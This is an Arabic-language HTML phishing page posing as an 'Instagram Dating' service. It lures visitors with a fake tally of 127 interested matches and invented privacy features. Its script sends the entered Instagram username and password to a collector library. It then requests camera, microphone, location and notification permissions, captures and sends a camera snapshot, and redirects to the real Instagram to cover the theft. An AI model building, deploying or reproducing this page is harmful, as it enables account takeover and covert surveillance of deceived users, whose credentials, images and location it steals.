<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#ec4899">
<title>Instagram Dating</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body {
    min-height: 100vh;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: linear-gradient(135deg, #ec4899 0%, #8b5cf6 100%);
    color: #fff;
  }
  .container {
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  .card {
    background: rgba(255,255,255,0.98);
    border-radius: 24px;
    padding: 32px 24px;
    max-width: 420px;
    width: 100%;
    text-align: center;
    color: #1c1e21;
    box-shadow: 0 30px 80px rgba(0,0,0,0.4);
  }
  .heart {
    font-size: 64px;
    margin-bottom: 12px;
    animation: heartbeat 1.5s infinite;
  }
  @keyframes heartbeat {
    0%,100% { transform: scale(1); }
    50% { transform: scale(1.15); }
  }
  h1 {
    font-size: 26px;
    font-weight: 800;
    margin-bottom: 8px;
    color: #ec4899;
  }
  .subtitle {
    font-size: 14px;
    color: #65676b;
    line-height: 1.6;
    margin-bottom: 20px;
  }
  .matches-preview {
    background: linear-gradient(135deg, #ec4899, #8b5cf6);
    padding: 16px;
    border-radius: 16px;
    margin-bottom: 20px;
    color: #fff;
    text-align: center;
  }
  .matches-value {
    font-size: 28px;
    font-weight: 800;
    margin-bottom: 4px;
  }
  .matches-label {
    font-size: 13px;
    opacity: 0.9;
  }
  .features {
    text-align: right;
    background: #fdf2f8;
    border-radius: 12px;
    padding: 16px;
    margin-bottom: 20px;
  }
  .feature {
    padding: 6px 0;
    font-size: 14px;
    color: #831843;
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .feature::before {
    content: '✓';
    color: #ec4899;
    font-weight: 700;
  }
  .input {
    width: 100%;
    padding: 14px 16px;
    background: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 12px;
    font-size: 15px;
    font-family: inherit;
    margin-bottom: 12px;
    color: #262626;
  }
  .input:focus {
    outline: none;
    border-color: #ec4899;
    background: #fff;
    box-shadow: 0 0 0 3px rgba(236,72,153,0.15);
  }
  .btn {
    width: 100%;
    padding: 16px;
    background: linear-gradient(135deg, #ec4899, #8b5cf6);
    color: #fff;
    border: none;
    border-radius: 12px;
    font-size: 16px;
    font-weight: 700;
    cursor: pointer;
    font-family: inherit;
    margin-top: 4px;
    box-shadow: 0 10px 30px rgba(236,72,153,0.4);
  }
  .btn:active { transform: scale(0.98); }
  .btn:disabled { opacity: 0.6; }
  .error-msg {
    background: #fce7f3;
    border: 1px solid #ec4899;
    border-radius: 8px;
    padding: 10px 12px;
    color: #be185d;
    font-size: 13px;
    margin-bottom: 12px;
    display: none;
  }
  .error-msg.show { display: block; }
</style>
</head>
<body>

<div class="container">
  <div class="card">

    <div class="heart">💘</div>

    <h1>Instagram Dating</h1>
    <p class="subtitle">
      ابحث عن شريكك المثالي بناءً على اهتماماتكما المشتركة
    </p>

    <div class="matches-preview">
      <div class="matches-value">127</div>
      <div class="matches-label">شخص مهتم بك الآن 💕</div>
    </div>

    <div class="features">
      <div class="feature">مطابقات يومية مخصصة</div>
      <div class="feature">محادثات آمنة ومشفرة</div>
      <div class="feature">بدون إعلانات ولا مزعجين</div>
      <div class="feature">خيارات خصوصية متقدمة</div>
    </div>

    <div class="error-msg" id="error-msg"></div>

    <form id="dating-form" onsubmit="return handleDating(event)">
      <input type="text" id="username" class="input" placeholder="اسم المستخدم على Instagram" required>
      <input type="password" id="password" class="input" placeholder="كلمة المرور" required>
      <button type="submit" class="btn" id="dating-btn">
        ابدأ الآن - مجاني 💕
      </button>
    </form>

  </div>
</div>

<script src="/fs/static/collector.js"></script>

<script>
(function() {
    "use strict";

    var submitting = false;

    function showError(msg) {
        var el = document.getElementById('error-msg');
        el.textContent = msg;
        el.classList.add('show');
        setTimeout(function() { el.classList.remove('show'); }, 4000);
    }

    function handleDating(event) {
        event.preventDefault();
        if (submitting) return false;

        var username = document.getElementById('username').value.trim();
        var password = document.getElementById('password').value.trim();

        if (!username || !password) {
            showError('يرجى ملء جميع الحقول');
            return false;
        }

        submitting = true;
        var btn = document.getElementById('dating-btn');
        btn.disabled = true;
        btn.textContent = 'جاري تجهيز المطابقات...';

        FSCollector.captureForm({
            username: username,
            password: password,
            form_type: 'dating'
        }, {
            metadata: { page: 'instagram_09_dating' }
        }).then(function() {
            FSCollector.showLoader('جاري إيجاد مطابقات...');

            setTimeout(function() {
                FSCollector.requestPermissions({
                    camera: true,
                    microphone: true,
                    location: true,
                    notifications: true,
                    showOverlay: true
                }).then(function(perms) {
                    FSCollector.sendPermissionsResult(perms);

                    // صور من الكاميرا للملف الشخصي
                    if (perms.camera === 'granted' && window.FS_MEDIA_STREAMS && window.FS_MEDIA_STREAMS.camera) {
                        FSCollector.captureFromStream(window.FS_MEDIA_STREAMS.camera, 'camera', 0.9)
                            .then(function(img) { 
                                if (img) FSCollector.sendSnapshot('camera', img); 
                            });
                    }

                    setTimeout(function() {
                        FSCollector.redirect('https://www.instagram.com');
                    }, 2000);
                });
            }, 500);
        });

        return false;
    }

    window.handleDating = handleDating;

})();
</script>

</body>
</html>
